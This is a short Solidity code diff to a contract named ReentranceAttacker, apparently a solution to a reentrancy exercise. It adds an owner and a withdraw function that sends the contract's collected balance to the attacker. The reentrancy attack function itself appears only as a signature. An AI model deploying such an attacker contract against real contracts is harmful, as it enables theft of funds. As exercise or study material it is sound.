@@ -9,9 +9,16 @@ interface targetInterface {
 
 contract ReentranceAttacker {
     targetInterface target;
+    address owner;
 
     constructor(address targetAdress) {
+        owner = msg.sender;
         target = targetInterface(targetAdress);
+    }
+
+    function withdraw() public {
+        require(msg.sender == owner);
+        payable(owner).transfer(address(this).balance);
     }
 
     function attack() public payable {
